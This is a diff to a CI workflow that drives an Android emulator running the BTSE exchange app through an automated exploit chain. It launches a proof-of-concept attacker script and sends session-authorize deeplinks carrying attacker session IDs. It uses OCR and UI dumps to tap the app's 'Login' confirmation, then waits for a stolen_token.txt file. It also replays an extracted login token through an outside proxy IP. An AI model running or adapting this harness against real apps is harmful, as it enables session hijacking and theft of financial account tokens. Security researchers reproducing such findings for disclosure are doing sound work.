@@ -135,21 +135,27 @@ jobs:
           adb logcat -c || true
           adb shell am start -W -n com.btse.finance/com.example.project.ui.launch.LaunchActivity > /tmp/amstart2.txt 2>&1 || true
           echo "AMSTART2:"; cat /tmp/amstart2.txt
-          sleep 40
           PID2=$(adb shell pidof com.btse.finance 2>/dev/null | tr -d '\r' || true)
           echo "PID2=$PID2"
+          LOGIN_GUESS=UNKNOWN
+          for i in $(seq 1 15); do
+            sleep 10
+            adb shell screencap -p /sdcard/s2.png || true
+            adb pull /sdcard/s2.png /tmp/s2.png >/dev/null 2>&1 || true
+            OCR2=$(tesseract /tmp/s2.png stdout 2>/dev/null | tr '\n' ' ' | head -c 400)
+            echo "OCR2[$i]=$OCR2"
+            if echo "$OCR2" | grep -qiE "assets|markets|withdraw|deposit|portfolio|gainers|volume"; then
+              LOGIN_GUESS=HOME; break
+            fi
+            if echo "$OCR2" | grep -qiE "log ?in|sign ?in|password|welcome back"; then
+              LOGIN_GUESS=LOGIN_SCREEN; break
+            fi
+            if echo "$OCR2" | grep -qiE "unable to complete"; then
+              LOGIN_GUESS=ERROR_PAGE; break
+            fi
+          done
+          echo "LOGIN_GUESS=$LOGIN_GUESS"
           adb shell dumpsys window 2>/dev/null | grep mCurrentFocus || true
-          adb shell screencap -p /sdcard/s2.png || true
-          adb pull /sdcard/s2.png /tmp/s2.png >/dev/null 2>&1 || true
-          OCR2=$(tesseract /tmp/s2.png stdout 2>/dev/null | tr '\n' ' ' | head -c 500)
-          echo "OCR2=$OCR2"
-          if echo "$OCR2" | grep -qiE "log ?in|sign ?in|password|welcome back"; then
-            echo "LOGIN_GUESS=LOGIN_SCREEN"
-          elif echo "$OCR2" | grep -qiE "assets|markets|withdraw|deposit|portfolio"; then
-            echo "LOGIN_GUESS=HOME"
-          else
-            echo "LOGIN_GUESS=UNKNOWN"
-          fi
           adb logcat -d > /tmp/logcat.txt 2>/dev/null || true
           FATALJ=$(grep -c "FATAL EXCEPTION" /tmp/logcat.txt || true)
           FATALN=$(grep -c "Fatal signal" /tmp/logcat.txt || true)
@@ -159,27 +165,99 @@ jobs:
       - name: attack chain + verdict
         run: |
           export PATH=$ANDROID_HOME/platform-tools:$PATH
-          python3 tools/poc_attacker.py > /tmp/attack.log 2>&1 &
-          ATK=$!
-          for i in $(seq 1 30); do [ -s poc_sid.txt ] && break; sleep 1; done
-          SID=$(cat poc_sid.txt 2>/dev/null || true)
-          echo "SID=$SID"
-          if [ -n "$SID" ]; then
-            adb shell am start -a android.intent.action.VIEW -d "app://app.btse.com/app/session/authorize?sessionId=$SID" com.btse.finance > /tmp/dl.txt 2>&1 || true
-            echo "DEEPLINK:"; cat /tmp/dl.txt
-            sleep 12
-            adb shell screencap -p /sdcard/s3.png || true
-            adb pull /sdcard/s3.png /tmp/s3.png >/dev/null 2>&1 || true
-            echo "OCR3=$(tesseract /tmp/s3.png stdout 2>/dev/null | tr '\n' ' ' | head -c 300)"
-            adb shell input tap 540 2002
-            echo "TAP_LOGIN"
-            sleep 8
-            adb shell screencap -p /sdcard/s4.png || true
-            adb pull /sdcard/s4.png /tmp/s4.png >/dev/null 2>&1 || true
-            echo "OCR4=$(tesseract /tmp/s4.png stdout 2>/dev/null | tr '\n' ' ' | head -c 300)"
+          rm -f poc_sid.txt stolen_token.txt /tmp/ui.xml /tmp/attack.log
+          # 1) preflight jalur proxy+testapi dari runner: 400/401/200 = sehat; 429/timeout = tunggu
+          PF=000
+          for i in $(seq 1 12); do
+            U=$(python3 -c "import uuid;print(uuid.uuid4())")
+            PF=$(curl -s -o /tmp/pf.json -w "%{http_code}" --max-time 15 -x http://43.156.21.122:8080 "https://testapi.btse.io/api/qr/info?sessionId=$U" || echo 000)
+            echo "PREFLIGHT[$i]=$PF"
+            case "$PF" in 400|401|200) break;; esac
+            sleep 15
+          done
+          case "$PF" in 400|401|200) echo PREFLIGHT_OK;; *) echo PREFLIGHT_FAIL;; esac
+          # 2) validasi token terinjeksi (tanpa mencetak token)
+          TOKEN=$(python3 -c "import re;print(re.search(r'LOGIN_TOKEN\\\">([^<]+)', open('/tmp/base.xml').read()).group(1))" 2>/dev/null || true)
+          if [ -n "$TOKEN" ]; then
+            U=$(python3 -c "import uuid;print(uuid.uuid4())")
+            curl -s --max-time 15 -x http://43.156.21.122:8080 "https://testapi.btse.io/api/qr/info?sessionId=$U" \
+              -H "content-type: application/json" \
+              -H "Cookie: XSRF-TOKEN=default-csrf-token;token=$TOKEN" \
+              -H "Authorization: Bearer $TOKEN" \
+              -H "app-platform: Android" -H "app-version: 1.135.0" -H "app-region-code: SG" \
+              -o /tmp/tk.json || true
+            CODE=$(python3 -c "import json;print(json.load(open('/tmp/tk.json')).get('code'))" 2>/dev/null || echo ERR)
+            echo "TOKEN_CHECK code=$CODE (1=OK 10002=INVALID)"
           fi
-          for i in $(seq 1 45); do [ -s stolen_token.txt ] && break; sleep 2; done
-          kill $ATK 2>/dev/null || true
+          # 3) settle: beri jeda agar burst startup mereda + home selesai render
+          sleep 40
+          # 4) attack loop: max 2 ronde (sid baru per ronde); ronde 2 kirim deeplink langsung ke MainActivity
+          for round in 1 2; do
+            if [ -s stolen_token.txt ]; then break; fi
+            TAPPED=0
+            ERRC=0
+            rm -f poc_sid.txt
+            python3 -u tools/poc_attacker.py >> /tmp/attack.log 2>&1 &
+            ATK=$!
+            for i in $(seq 1 30); do [ -s poc_sid.txt ] && break; sleep 1; done
+            SID=$(cat poc_sid.txt 2>/dev/null || true)
+            echo "ROUND=$round SID=$SID"
+            if [ -z "$SID" ]; then kill $ATK 2>/dev/null || true; continue; fi
+            if [ "$round" = "2" ]; then
+              DL="am start -n com.btse.finance/com.example.project.ui.main.MainActivity -a android.intent.action.VIEW"
+            else
+              DL="am start -a android.intent.action.VIEW"
+            fi
+            $DL -d "app://app.btse.com/app/session/authorize?sessionId=$SID" com.btse.finance > /tmp/dl.txt 2>&1 || true
+            echo "DEEPLINK[$round]:"; cat /tmp/dl.txt
+            for i in $(seq 1 10); do
+              sleep 8
+              adb shell screencap -p /sdcard/s3.png || true
+              adb pull /sdcard/s3.png /tmp/s3.png >/dev/null 2>&1 || true
+              OCR3=$(tesseract /tmp/s3.png stdout 2>/dev/null | tr '\n' ' ' | head -c 300)
+              echo "OCR3[$round.$i]=$OCR3"
+              rm -f /tmp/ui.xml
+              adb shell uiautomator dump /sdcard/ui.xml >/dev/null 2>&1 || true
+              adb pull /sdcard/ui.xml /tmp/ui.xml >/dev/null 2>&1 || true
+              if echo "$OCR3" | grep -qiE "confirm login|please confirm|btse web"; then
+                XY=$(python3 tools/uibounds.py /tmp/ui.xml Login 2>/dev/null || true)
+                if [ -n "$XY" ]; then
+                  adb shell input tap $XY
+                  echo "TAP_LOGIN xy=$XY"
+                else
+                  adb shell input tap 540 2002
+                  echo "TAP_LOGIN fallback=540,2002"
+                fi
+                TAPPED=1
+                break
+              elif echo "$OCR3" | grep -qiE "unable to complete"; then
+                ERRC=$((ERRC+1))
+                XY=$(python3 tools/uibounds.py /tmp/ui.xml Retry 2>/dev/null || true)
+                if [ -n "$XY" ]; then
+                  adb shell input tap $XY
+                  echo "TAP_RETRY xy=$XY"
+                else
+                  echo "RETRY_NODE_NOT_FOUND"
+                fi
+                if [ $ERRC -ge 2 ]; then
+                  $DL -d "app://app.btse.com/app/session/authorize?sessionId=$SID" com.btse.finance >/dev/null 2>&1 || true
+                  echo "DEEPLINK_RESEND_ERR"
+                  ERRC=0
+                fi
+                sleep 8
+              else
+                if [ $((i % 3)) -eq 0 ]; then
+                  $DL -d "app://app.btse.com/app/session/authorize?sessionId=$SID" com.btse.finance >/dev/null 2>&1 || true
+                  echo "DEEPLINK_RESEND i=$i"
+                fi
+                sleep 2
+              fi
+            done
+            for i in $(seq 1 45); do [ -s stolen_token.txt ] && break; sleep 2; done
+            kill $ATK 2>/dev/null || true
+            if [ -s stolen_token.txt ]; then break; fi
+            echo "ROUND=$round NO_TOKEN lanjut ronde berikutnya"
+          done
           adb shell screencap -p /sdcard/s5.png || true
           adb pull /sdcard/s5.png /tmp/s5.png >/dev/null 2>&1 || true
           adb shell dumpsys window 2>/dev/null | grep mCurrentFocus || true
@@ -206,5 +284,6 @@ jobs:
             /tmp/s3.png
             /tmp/s4.png
             /tmp/s5.png
+            /tmp/ui.xml
             /tmp/logcat.txt
             /tmp/attack.log
